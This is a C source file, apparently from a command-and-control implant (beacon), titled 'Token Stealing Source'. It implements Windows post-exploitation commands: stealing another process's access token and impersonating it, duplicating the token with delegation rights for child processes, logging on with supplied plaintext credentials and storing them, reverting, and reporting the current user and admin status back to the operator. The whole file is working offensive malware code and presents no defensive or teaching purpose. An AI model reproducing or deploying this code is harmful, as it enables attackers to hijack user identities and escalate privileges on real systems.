/*
 *  Token Stealing Source
 */ 
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "tokens.h"
#include "tasks.h"
#include "commands.h"
#include "beacon.h"
#include "parse.h"
#include <WinSock2.h>

/* populate a buffer with DOMAIN\user from a token.
   Return TRUE on success. FALSE otherwise  */
BOOL token_user(HANDLE token, char * buffer, int length);

/* global token */
HANDLE atoken = NULL;
ALTCREDS acreds = { 0 };

/* make sure we do not make HTTP requests with impersonated tokens... don't want to screw up our
   ability to go through a proxy server later */
void token_guard_start() {
	if (atoken != NULL) {
		RevertToSelf();
	}
}

void token_guard_start_maybe(BOOL ignoreToken) {
	if (ignoreToken)
		token_guard_start();
}

/* go back to our impersonated token if there is one */
void token_guard_stop() {
	if (atoken != NULL) {
		ImpersonateLoggedOnUser(atoken);
	}
}

void token_guard_stop_maybe(BOOL ignoreToken) {
	if (ignoreToken)
		token_guard_stop();
}

/* drop the impersonated token */
void command_rev2self() {
	/* make the stored token NULL as well */
	if (atoken)
		CloseHandle(atoken);
	atoken = NULL;
	RevertToSelf();

	/* nuke our alternate creds too */
	if (acreds.manager != NULL) {
		data_free((datap *)acreds.manager);
		memset(&acreds, 0, sizeof(ALTCREDS));
	}
}

/* populate buffer with the USER\whatever of the token */
BOOL token_user(HANDLE token, char * buffer, int length) {
	CHAR username_only[512], domainname_only[512];
	LPVOID TokenUserInfo[4096];
	DWORD domain_length = sizeof(domainname_only);
	DWORD user_length = sizeof(username_only), sid_type = 0, returned_tokinfo_length;

	memset(buffer, 0, length);
	memset(username_only, 0, sizeof(username_only));
	memset(domainname_only, 0, sizeof(domainname_only));

	/* try to get token information */
	if (!GetTokenInformation(token, TokenUser, TokenUserInfo, 4096, &returned_tokinfo_length))
		return FALSE;

	/* try to lookup account information */
	if (!LookupAccountSidA(NULL, ((TOKEN_USER*)TokenUserInfo)->User.Sid, username_only, &user_length, domainname_only, &domain_length, (PSID_NAME_USE)&sid_type))
		return FALSE;

	/* covert to the DOMAIN\USERNAME format */
	_snprintf(buffer, length, "%s\\%s", domainname_only, username_only);
	buffer[length - 1] = '\0';

	return TRUE;
}

void token_output(HANDLE token, void(*callback)(char * buffer, int length, int type)) {
	char name[512];
	char result[1024];

	/* populate our token buffer */
	if (token_user(token, name, 512)) {
		if (is_admin()) {
			_snprintf(result, 1024, "%s (admin)", name);
		}
		else {
			_snprintf(result, 1024, "%s", name);
		}
		callback(result, strlen(result), CALLBACK_TOKEN_GETUID);
	}
}

/* code to GETUID of a user */
void command_getuid(char * buffer, int length, void(*callback)(char * buffer, int length, int type)) {
	HANDLE token;

	/* try to open thread token */
	if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &token)) {
		token_output(token, callback);
		CloseHandle(token);
	}
	/* then process token if that fails */
	else if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
		token_output(token, callback);
		CloseHandle(token);
	}
	/* try our stored token, if all else fails... */
	else if (atoken != NULL) {
		token_guard_start();
		token_output(atoken, callback);
		token_guard_stop();
	}
	else {
		post_error_na(0x1);
	}
}

/* steal a token y0 */
void command_steal_token(char * buffer, int length, void (*callback)(char * buffer, int length, int type)) {
	int pid;
	HANDLE token = NULL;
	HANDLE handle = NULL;
	char name[512];

	/* extract pid from buffer */
	if (length != 4)
		return;

	memcpy((char *)&pid, (char *)buffer, 4);
	pid = ntohl(pid);

	/* obtain a handle to the process we want */
	handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);

	if (!handle) {
		post_error_dd(0x21, pid, GetLastError());
		return;
	}

	/* try to grab that processes's token */
	if (!OpenProcessToken(handle, TOKEN_ALL_ACCESS, &token)) {
		post_error_dd(0x24, pid, GetLastError());
		return;
	}

	/* at this point, let's drop our old token (assuming we have one) */
	command_rev2self();

	/* try to steal the token (and this *may* be good enough) */
	if (!ImpersonateLoggedOnUser(token)) {
		post_error_dd(0x25, pid, GetLastError());
		return;
	}

	/* try to duplicate the token into xtoken... why? So we can propagate it to child processes.
	   may need to update execute/shell to use a stored xtoken */
	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &atoken)) {
		post_error_dd(0x26, pid, GetLastError());
		return;
	}

	/* for some reason, I need to do this a second time to make the current thread take on
	   the impersonated token. *shrug* */
	if (!ImpersonateLoggedOnUser(atoken)) {
		post_error_dd(0x27, pid, GetLastError());
		return;
	}

	/* clean up, because that's how we do it here... y0 */
	if (handle)
		CloseHandle(handle);

	if (token)
		CloseHandle(token);

	if (token_user(atoken, name, 512)) {
		callback(name, strlen(name), CALLBACK_TOKEN_STOLEN);
	}
}

void logintoken(char * domain, char * user, char * pass, void(*callback)(char * buffer, int length, int type)) {
	/* drop the current token and clean it up */
	command_rev2self();

	/* try to create a token with these credentials */
	if (!LogonUserA(user, domain, pass, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50, &atoken)) {
		post_error_d(0x18, GetLastError());
		return;
	}

	/* try to steal the token (and this *may* be good enough) */
	if (!ImpersonateLoggedOnUser(atoken)) {
		post_error_d(0x19, GetLastError());
		return;
	}

	/* allocate our alternate credentials */
	acreds.manager = data_alloc(sizeof(wchar_t) * 1024);  /* TODO: cleaned up in command_rev2self(), is it normally cleaned up via workflows? mask candidate? on exit. */
	acreds.domain   = (wchar_t *)data_ptr((datap*)acreds.manager, sizeof(wchar_t) * 256);
	acreds.user     = (wchar_t *)data_ptr((datap*)acreds.manager, sizeof(wchar_t) * 256);
	acreds.password = (wchar_t *)data_ptr((datap*)acreds.manager, sizeof(wchar_t) * 512);

	/* populate them, please */
	toWideChar(user, acreds.user, 256);
	toWideChar(domain, acreds.domain, 256);
	toWideChar(pass, acreds.password, 512);
	acreds.active = TRUE;

	/* let the user know... the truth! */
	if (token_user(atoken, user, 1024)) {
		callback(user, strlen(user), CALLBACK_TOKEN_STOLEN);
	}
}

/* create a token with credentials... k thx */
void command_loginuser(char * buffer, int length, void(*callback)(char * buffer, int length, int type)) {
	datap * blob;
	char  * domain;
	char  * user;
	char  * pass;
	datap parser;

	/* allocate our memory */
	blob = data_alloc(1024 * 3); /* TODO cleaned up at end but some early exits are not handled. */

	domain = data_ptr(blob, 1024);
	user   = data_ptr(blob, 1024);
	pass   = data_ptr(blob, 1024);

	/* setup our data parser */
	data_init(&parser, buffer, length);

	/* extract our parameters */
	if (!data_string(&parser, domain, 1024))
		return;

	if (!data_string(&parser, user, 1024))
		return;

	if (!data_string(&parser, pass, 1024))
		return;

	/* do some login user magic? */
		/* NOTE: I re-use the user buffer and assume it's 1024 bytes */
	logintoken(domain, user, pass, callback);

	/* free our data? */
	data_free(blob);
}

/* check if current user is administrator or not */
BOOL is_admin() {
	BOOL b;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	PSID AdministratorsGroup; 
	b = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup); 

	if (b)  {
		if (!CheckTokenMembership(NULL, AdministratorsGroup, &b)) {
			b = FALSE;
		} 
		FreeSid(AdministratorsGroup);
	}

	return b;
}

BOOL use_token(HANDLE token, char * name, DWORD nlen) {
	/* at this point, let's drop our old token (assuming we have one) */
	command_rev2self();

	/* try to steal the token (and this *may* be good enough) */
	if (!ImpersonateLoggedOnUser(token))
		return FALSE;

	/* try to duplicate the token into xtoken... why? So we can propagate it to child processes.
	may need to update execute/shell to use a stored xtoken */
	if (!DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityDelegation, TokenPrimary, &atoken))
		return FALSE;

	/* for some reason, I need to do this a second time to make the current thread take on
	the impersonated token. *shrug* */
	if (!ImpersonateLoggedOnUser(atoken))
		return FALSE;

	if (!token_user(atoken, name, nlen))
		return FALSE;

	command_shell_callback(name, strlen(name), CALLBACK_TOKEN_STOLEN);
	return TRUE;
}